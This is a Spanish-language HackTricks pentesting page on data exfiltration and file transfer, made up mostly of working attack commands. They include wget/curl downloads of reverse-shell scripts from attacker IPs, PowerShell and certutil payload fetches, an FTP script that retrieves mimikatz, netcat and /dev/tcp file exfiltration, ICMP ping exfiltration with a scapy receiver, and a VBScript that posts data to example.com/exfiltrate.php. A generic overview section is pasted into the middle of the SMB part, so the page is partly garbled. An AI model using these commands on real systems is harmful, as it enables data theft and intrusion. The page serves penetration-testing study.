## Exfiltración

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtén el [**swag oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) **grupo de Discord** o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<img src="../.gitbook/assets/image (620) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (21).png" alt="" data-size="original">\
**Consejo de bug bounty**: **regístrate** en **Intigriti**, una plataforma premium de **bug bounty creada por hackers, para hackers**. ¡Únete a nosotros en [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) hoy mismo y comienza a ganar recompensas de hasta **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

## Copiar y pegar Base64

**Linux**
```bash
base64 -w0 <file> #Encode file
base64 -d file #Decode file
```
**Windows**
```
certutil -encode payload.dll payload.b64
certutil -decode payload.b64 payload.dll
```
## HTTP

**Linux**
```bash
wget 10.10.14.14:8000/tcp_pty_backconnect.py -O /dev/shm/.rev.py
wget 10.10.14.14:8000/tcp_pty_backconnect.py -P /dev/shm
curl 10.10.14.14:8000/shell.py -o /dev/shm/shell.py
fetch 10.10.14.14:8000/shell.py #FreeBSD
```
**Windows**
```bash
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64
bitsadmin /transfer transfName /priority high http://example.com/examplefile.pdf C:\downloads\examplefile.pdf

#PS
(New-Object Net.WebClient).DownloadFile("http://10.10.14.2:80/taskkill.exe","C:\Windows\Temp\taskkill.exe")
Invoke-WebRequest "http://10.10.14.2:80/taskkill.exe" -OutFile "taskkill.exe"
wget "http://10.10.14.2/nc.bat.exe" -OutFile "C:\ProgramData\unifivideo\taskkill.exe"

Import-Module BitsTransfer
Start-BitsTransfer -Source $url -Destination $output
#OR
Start-BitsTransfer -Source $url -Destination $output -Asynchronous
```
### Subir archivos

* [**SimpleHttpServerWithFileUploads**](https://gist.github.com/UniIsland/3346170)
* [**SimpleHttpServer imprimiendo GET y POSTs (también encabezados)**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
* Módulo de Python [uploadserver](https://pypi.org/project/uploadserver/):
```bash
# Listen to files
python3 -m pip install --user uploadserver
python3 -m uploadserver
# With basic auth: 
# python3 -m uploadserver --basic-auth hello:world

# Send a file
curl -X POST http://HOST/upload -H -F 'files=@file.txt' 
# With basic auth:
# curl -X POST http://HOST/upload -H -F 'files=@file.txt' -u hello:world
```
### **Servidor HTTPS**

El protocolo HTTPS es una versión segura del protocolo HTTP que utiliza cifrado SSL/TLS para proteger la comunicación entre el cliente y el servidor. Un servidor HTTPS es un servidor web que utiliza este protocolo para proporcionar una conexión segura a los clientes. 

Para exfiltrar datos a través de un servidor HTTPS, se puede utilizar una variedad de técnicas, como la creación de un canal encubierto en el tráfico HTTPS normal o la creación de un servidor HTTPS malicioso que recopila los datos exfiltrados. 

Es importante tener en cuenta que la creación de un servidor HTTPS malicioso puede ser ilegal y puede tener graves consecuencias legales. Por lo tanto, se debe tener cuidado al utilizar esta técnica y asegurarse de que se cumplan todas las leyes y regulaciones aplicables.
```python
# from https://gist.github.com/dergachev/7028596
# taken from http://www.piware.de/2011/01/creating-an-https-server-in-python/
# generate server.xml with the following command:
#    openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
# run as follows:
#    python simple-https-server.py
# then in your browser, visit:
#    https://localhost:443

### PYTHON 2
import BaseHTTPServer, SimpleHTTPServer
import ssl

httpd = BaseHTTPServer.HTTPServer(('0.0.0.0', 443), SimpleHTTPServer.SimpleHTTPRequestHandler)
httpd.socket = ssl.wrap_socket (httpd.socket, certfile='./server.pem', server_side=True)
httpd.serve_forever()
###

### PYTHON3
from http.server import HTTPServer, BaseHTTPRequestHandler
import ssl

httpd = HTTPServer(('0.0.0.0', 443), BaseHTTPRequestHandler)
httpd.socket = ssl.wrap_socket(httpd.socket, certfile="./server.pem", server_side=True)
httpd.serve_forever()
###

### USING FLASK
from flask import Flask, redirect, request
from urllib.parse import quote
app = Flask(__name__)    
@app.route('/')    
def root():    
    print(request.get_json())
    return "OK"
if __name__ == "__main__":    
    app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
###
```
## FTP

### Servidor FTP (Python)
```bash
pip3 install pyftpdlib
python3 -m pyftpdlib -p 21
```
### Servidor FTP (NodeJS)

El servidor FTP es una herramienta comúnmente utilizada para transferir archivos entre sistemas. En este caso, se utiliza NodeJS para crear un servidor FTP que permita la transferencia de archivos desde y hacia el servidor.

Para crear un servidor FTP en NodeJS, se puede utilizar el módulo `ftp-srv`. Este módulo proporciona una API fácil de usar para crear un servidor FTP personalizado.

Para instalar el módulo `ftp-srv`, se puede utilizar el siguiente comando:

```
npm install ftp-srv
```

Una vez instalado el módulo, se puede crear un servidor FTP básico utilizando el siguiente código:

```javascript
const FtpSrv = require('ftp-srv');

const ftpServer = new FtpSrv({
  url: 'ftp://127.0.0.1:21',
  pasv_url: 'ftp://127.0.0.1:3000',
  greeting: 'Welcome to my FTP server'
});

ftpServer.on('login', ({connection, username, password}, resolve, reject) => {
  if (username === 'user' && password === 'pass') {
    resolve({root: '/path/to/ftp/root'});
  } else {
    reject(new Error('Bad username or password'));
  }
});

ftpServer.listen()
  .then(() => {
    console.log('FTP server listening');
  });
```

Este código crea un servidor FTP que escucha en el puerto 21 y utiliza el puerto 3000 para las conexiones pasivas. También se proporciona un mensaje de bienvenida personalizado.

El servidor FTP requiere autenticación para acceder a los archivos. En este ejemplo, se utiliza el nombre de usuario "user" y la contraseña "pass". Si se proporcionan credenciales incorrectas, se devuelve un error.

Una vez que se ha iniciado el servidor FTP, se pueden utilizar clientes FTP para conectarse y transferir archivos.
```
sudo npm install -g ftp-srv --save
ftp-srv ftp://0.0.0.0:9876 --root /tmp
```
### Servidor FTP (pure-ftp)

El protocolo FTP (File Transfer Protocol) es uno de los protocolos más antiguos y ampliamente utilizados para transferir archivos entre sistemas. El servidor FTP es un servidor que se ejecuta en un sistema y permite a los usuarios cargar y descargar archivos desde el servidor utilizando el protocolo FTP.

Pure-FTP es un servidor FTP de código abierto que es fácil de configurar y usar. Es compatible con una amplia variedad de sistemas operativos y es muy popular entre los administradores de sistemas y los usuarios finales.

La exfiltración de datos a través de un servidor FTP es una técnica común utilizada por los atacantes para robar datos de una organización. Los atacantes pueden utilizar una variedad de técnicas para comprometer un servidor FTP, incluyendo la explotación de vulnerabilidades conocidas, la ingeniería social y el uso de contraseñas débiles.

Para evitar la exfiltración de datos a través de un servidor FTP, es importante asegurarse de que el servidor esté configurado de manera segura y de que se utilicen contraseñas fuertes y políticas de seguridad adecuadas. Además, es importante monitorear regularmente el servidor para detectar cualquier actividad sospechosa y tomar medidas inmediatas para remediar cualquier problema.
```bash
apt-get update && apt-get install pure-ftp
```

```bash
#Run the following script to configure the FTP server
#!/bin/bash
groupadd ftpgroup
useradd -g ftpgroup -d /dev/null -s /etc ftpuser
pure-pwd useradd fusr -u ftpuser -d /ftphome
pure-pw mkdb
cd /etc/pure-ftpd/auth/
ln -s ../conf/PureDB 60pdb
mkdir -p /ftphome
chown -R ftpuser:ftpgroup /ftphome/
/etc/init.d/pure-ftpd restart
```
### Cliente **Windows**
```bash
#Work well with python. With pure-ftp use fusr:ftp
echo open 10.11.0.41 21 > ftp.txt
echo USER anonymous >> ftp.txt
echo anonymous >> ftp.txt
echo bin >> ftp.txt
echo GET mimikatz.exe >> ftp.txt
echo bye >> ftp.txt
ftp -n -v -s:ftp.txt
```
## SMB

Kali como servidor
```bash
kali_op1> impacket-smbserver -smb2support kali `pwd` # Share current directory
kali_op2> smbserver.py -smb2support name /path/folder # Share a folder
#For new Win10 versions
impacket-smbserver -smb2support -user test -password test test `pwd`
```
O crear un recurso compartido smb **usando samba**:
```bash
apt-get install samba
mkdir /tmp/smb
chmod 777 /tmp/smb
#Add to the end of /etc/samba/smb.conf this:
[public]
    comment = Samba on Ubuntu
    path = /tmp/smb
    read only = no
    browsable = yes
    guest ok = Yes
#Start samba
service smbd restart
```
# Exfiltración

La exfiltración es el proceso de sacar datos de una red comprometida. En esta sección, se discutirán algunas técnicas comunes de exfiltración que se pueden utilizar en sistemas Windows.

## FTP

FTP es un protocolo de transferencia de archivos que se utiliza comúnmente para la transferencia de archivos en una red. Los atacantes pueden utilizar FTP para exfiltrar datos de una red comprometida. Para hacer esto, el atacante puede configurar un servidor FTP en una máquina controlada por el atacante y luego transferir los datos a través de FTP.

## HTTP

HTTP es un protocolo utilizado para la transferencia de datos en la World Wide Web. Los atacantes pueden utilizar HTTP para exfiltrar datos de una red comprometida. Para hacer esto, el atacante puede configurar un servidor web en una máquina controlada por el atacante y luego transferir los datos a través de HTTP.

## DNS

DNS es un protocolo utilizado para resolver nombres de dominio en direcciones IP. Los atacantes pueden utilizar DNS para exfiltrar datos de una red comprometida. Para hacer esto, el atacante puede configurar un servidor DNS en una máquina controlada por el atacante y luego enviar los datos a través de consultas DNS.

## Correo electrónico

Los atacantes pueden utilizar el correo electrónico para exfiltrar datos de una red comprometida. Para hacer esto, el atacante puede configurar una cuenta de correo electrónico en un servidor controlado por el atacante y luego enviar los datos a través de correos electrónicos.

## USB

Los atacantes pueden utilizar dispositivos USB para exfiltrar datos de una red comprometida. Para hacer esto, el atacante puede copiar los datos en un dispositivo USB y luego sacar el dispositivo de la red comprometida.

## Conclusiones

La exfiltración de datos es una parte importante del proceso de ataque. Los atacantes utilizan una variedad de técnicas para exfiltrar datos de una red comprometida. Es importante que los administradores de sistemas estén al tanto de estas técnicas y tomen medidas para prevenirlas.
```bash
CMD-Wind> \\10.10.14.14\path\to\exe
CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentials

WindPS-1> New-PSDrive -Name "new_disk" -PSProvider "FileSystem" -Root "\\10.10.14.9\kali"
WindPS-2> cd new_disk:
```
## SCP

El atacante debe tener SSHd en ejecución.
```bash
scp <username>@<Attacker_IP>:<directory>/<filename> 
```
## SSHFS

Si la víctima tiene SSH, el atacante puede montar un directorio desde la víctima hacia el atacante.
```bash
sudo apt-get install sshfs
sudo mkdir /mnt/sshfs
sudo sshfs -o allow_other,default_permissions <Target username>@<Target IP address>:<Full path to folder>/ /mnt/sshfs/
```
## NC

NC (Netcat) es una herramienta de red que se utiliza para leer y escribir datos a través de conexiones de red utilizando TCP o UDP. Es una herramienta muy versátil que se puede utilizar para muchas tareas diferentes, incluyendo la exfiltración de datos.

Para utilizar NC para la exfiltración de datos, primero debe establecer una conexión entre la máquina de origen y la máquina de destino. Una vez que se ha establecido la conexión, puede utilizar NC para enviar los datos desde la máquina de origen a la máquina de destino.

NC también se puede utilizar para crear túneles de red, lo que permite a los atacantes acceder a sistemas remotos a través de conexiones de red seguras. Esto se puede hacer utilizando la opción -L de NC para escuchar en un puerto específico y la opción -p para especificar el puerto de destino.

NC es una herramienta muy poderosa que se utiliza comúnmente en pruebas de penetración y en ataques de hacking. Es importante tener en cuenta que el uso de NC para fines malintencionados puede ser ilegal y puede resultar en consecuencias graves.
```bash
nc -lvnp 4444 > new_file
nc -vn <IP> 4444 < exfil_file
```
## /dev/tcp

### Descargar archivo desde la víctima
```bash
nc -lvnp 80 > file #Inside attacker
cat /path/file > /dev/tcp/10.10.10.10/80 #Inside victim
```
### Subir archivo al objetivo
```bash
nc -w5 -lvnp 80 < file_to_send.txt # Inside attacker
# Inside victim
exec 6< /dev/tcp/10.10.10.10/4444
cat <&6 > file.txt
```
## **ICMP**

El Protocolo de Mensajes de Control de Internet (ICMP, por sus siglas en inglés) es un protocolo de red utilizado para enviar mensajes de error y de control entre dispositivos en una red IP. ICMP se utiliza comúnmente para probar la conectividad de red y para diagnosticar problemas de red. En el contexto de la exfiltración de datos, ICMP se puede utilizar para enviar datos fuera de una red sin ser detectado. Esto se logra mediante la inserción de datos en los campos de datos de los mensajes ICMP y el envío de estos mensajes a un servidor controlado por el atacante fuera de la red. El servidor controlado por el atacante puede luego extraer los datos de los mensajes ICMP y reconstruir los datos originales.
```bash
# To exfiltrate the content of a file via pings you can do:
xxd -p -c 4 /path/file/exfil | while read line; do ping -c 1 -p $line <IP attacker>; done
#This will 4bytes per ping packet (you could probably increase this until 16)
```

```python
from scapy.all import *
#This is ippsec receiver created in the HTB machine Mischief
def process_packet(pkt):
    if pkt.haslayer(ICMP):
        if pkt[ICMP].type == 0:
            data = pkt[ICMP].load[-4:] #Read the 4bytes interesting
            print(f"{data.decode('utf-8')}", flush=True, end="")

sniff(iface="tun0", prn=process_packet)
```
## **SMTP**

Si puedes enviar datos a un servidor SMTP, puedes crear un servidor SMTP para recibir los datos con Python:
```bash
sudo python -m smtpd -n -c DebuggingServer :25
```
## TFTP

Por defecto en XP y 2003 (en otros sistemas operativos es necesario agregarlo explícitamente durante la instalación)

En Kali, **inicie el servidor TFTP**:
```bash
#I didn't get this options working and I prefer the python option
mkdir /tftp
atftpd --daemon --port 69 /tftp
cp /path/tp/nc.exe /tftp
```
**Servidor TFTP en Python:**

El siguiente código es un servidor TFTP básico escrito en Python. El servidor es capaz de manejar solicitudes de lectura y escritura de archivos y puede ser utilizado para exfiltrar datos de una red.

```python
import socket
import struct

# TFTP opcodes
RRQ = 1
WRQ = 2
DATA = 3
ACK = 4
ERROR = 5

# TFTP error codes
ERR_FILE_NOT_FOUND = 1
ERR_ACCESS_VIOLATION = 2
ERR_DISK_FULL = 3
ERR_ILLEGAL_OPERATION = 4
ERR_UNKNOWN_TID = 5
ERR_FILE_EXISTS = 6
ERR_NO_SUCH_USER = 7

def send_error(sock, error_code, error_msg):
    """Send a TFTP error packet."""
    packet = struct.pack('!H', ERROR) + struct.pack('!H', error_code) + error_msg.encode() + b'\x00'
    sock.sendto(packet, client_address)

def handle_rrq(sock, client_address, filename):
    """Handle a TFTP read request."""
    try:
        with open(filename, 'rb') as f:
            block_num = 1
            while True:
                data = f.read(512)
                if not data:
                    break
                packet = struct.pack('!H', DATA) + struct.pack('!H', block_num) + data
                sock.sendto(packet, client_address)
                ack, _ = sock.recvfrom(4)
                if struct.unpack('!H', ack[:2])[0] != ACK or struct.unpack('!H', ack[2:])[0] != block_num:
                    send_error(sock, ERR_ILLEGAL_OPERATION, 'Invalid ACK received.')
                    return
                block_num += 1
    except FileNotFoundError:
        send_error(sock, ERR_FILE_NOT_FOUND, 'File not found.')
    except PermissionError:
        send_error(sock, ERR_ACCESS_VIOLATION, 'Access violation.')
    except Exception as e:
        send_error(sock, ERR_UNKNOWN_TID, str(e))

def handle_wrq(sock, client_address, filename):
    """Handle a TFTP write request."""
    try:
        with open(filename, 'wb') as f:
            block_num = 0
            while True:
                ack = struct.pack('!H', ACK) + struct.pack('!H', block_num)
                sock.sendto(ack, client_address)
                data, _ = sock.recvfrom(516)
                if struct.unpack('!H', data[:2])[0] != DATA or struct.unpack('!H', data[2:4])[0] != block_num + 1:
                    send_error(sock, ERR_ILLEGAL_OPERATION, 'Invalid data packet received.')
                    return
                f.write(data[4:])
                block_num += 1
                if len(data) < 516:
                    break
    except PermissionError:
        send_error(sock, ERR_ACCESS_VIOLATION, 'Access violation.')
    except Exception as e:
        send_error(sock, ERR_UNKNOWN_TID, str(e))

def main():
    """Start the TFTP server."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind(('0.0.0.0', 69))
    print('TFTP server listening on port 69...')
    while True:
        data, client_address = sock.recvfrom(1024)
        opcode = struct.unpack('!H', data[:2])[0]
        filename = data[2:data.index(b'\x00', 2)].decode()
        if opcode == RRQ:
            handle_rrq(sock, client_address, filename)
        elif opcode == WRQ:
            handle_wrq(sock, client_address, filename)
        else:
            send_error(sock, ERR_ILLEGAL_OPERATION, 'Invalid opcode.')
```
```bash
pip install ptftpd
ptftpd -p 69 tap0 . # ptftp -p <PORT> <IFACE> <FOLDER>
```
En **víctima**, conectarse al servidor Kali:
```bash
tftp -i <KALI-IP> get nc.exe
```
## PHP

Descargar un archivo con una línea de código PHP:
```bash
echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>" > down2.php
```
## VBScript

VBScript es un lenguaje de scripting que se ejecuta en sistemas operativos Windows. Es un lenguaje interpretado que se utiliza para automatizar tareas en el sistema operativo y en aplicaciones de Microsoft. VBScript se puede utilizar para exfiltrar datos de un sistema comprometido. 

### Exfiltración de datos con VBScript

VBScript se puede utilizar para exfiltrar datos de un sistema comprometido. El siguiente script de VBScript se puede utilizar para exfiltrar datos a través de HTTP:

```vbscript
Dim objXMLHTTP, strData
Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP")
strData = "data to exfiltrate"
objXMLHTTP.open "POST", "http://example.com/exfiltrate.php", False
objXMLHTTP.setRequestHeader "Content-Type", "application/x-www-form-urlencoded"
objXMLHTTP.send "data=" & strData
```

Este script crea un objeto `XMLHTTP` y lo utiliza para enviar una solicitud HTTP POST a un servidor remoto. El script también establece el tipo de contenido de la solicitud y envía los datos a través del cuerpo de la solicitud.

### Prevención de la exfiltración de datos con VBScript

Para prevenir la exfiltración de datos con VBScript, se pueden tomar las siguientes medidas:

- Restringir el acceso a los scripts de VBScript en el sistema.
- Utilizar software de detección de intrusiones para detectar y bloquear la exfiltración de datos.
- Monitorizar el tráfico de red en busca de patrones de exfiltración de datos.
- Utilizar soluciones de seguridad de endpoint para detectar y bloquear la exfiltración de datos.
```bash
Attacker> python -m SimpleHTTPServer 80
```
**Víctima**
```bash
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Nothing Then Set http =CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET", strURL, False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs
```

```bash
cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
```
## Debug.exe

Esta es una técnica loca que funciona en máquinas Windows de 32 bits. La idea es usar el programa `debug.exe`. Se utiliza para inspeccionar binarios, como un depurador. Pero también puede reconstruirlos a partir de hex. Entonces, la idea es que tomemos binarios, como `netcat`. Y luego lo desensamblamos en hex, lo pegamos en un archivo en la máquina comprometida y luego lo ensamblamos con `debug.exe`.

`Debug.exe` solo puede ensamblar 64 kb. Entonces necesitamos usar archivos más pequeños que eso. Podemos usar upx para comprimirlo aún más. Así que hagámoslo:
```
upx -9 nc.exe
```
Ahora solo pesa 29 kb. Perfecto. Ahora vamos a desensamblarlo:
```
wine exe2bat.exe nc.exe nc.txt
```
Ahora simplemente copiamos y pegamos el texto en nuestra ventana de shell de Windows. Y automáticamente creará un archivo llamado nc.exe

## DNS

* [https://github.com/62726164/dns-exfil](https://github.com/62726164/dns-exfil)

<img src="../.gitbook/assets/image (620) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (21).png" alt="" data-size="original">\
**Consejo de recompensa por errores**: ¡**Regístrese** en **Intigriti**, una plataforma premium de **recompensas por errores creada por hackers, para hackers**! ¡Únase a nosotros en [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) hoy mismo y comience a ganar recompensas de hasta **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabaja en una **empresa de ciberseguridad**? ¿Quiere ver su **empresa anunciada en HackTricks**? ¿O quiere tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulte los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenga la [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Únase al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígame** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparta sus trucos de hacking enviando PR al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
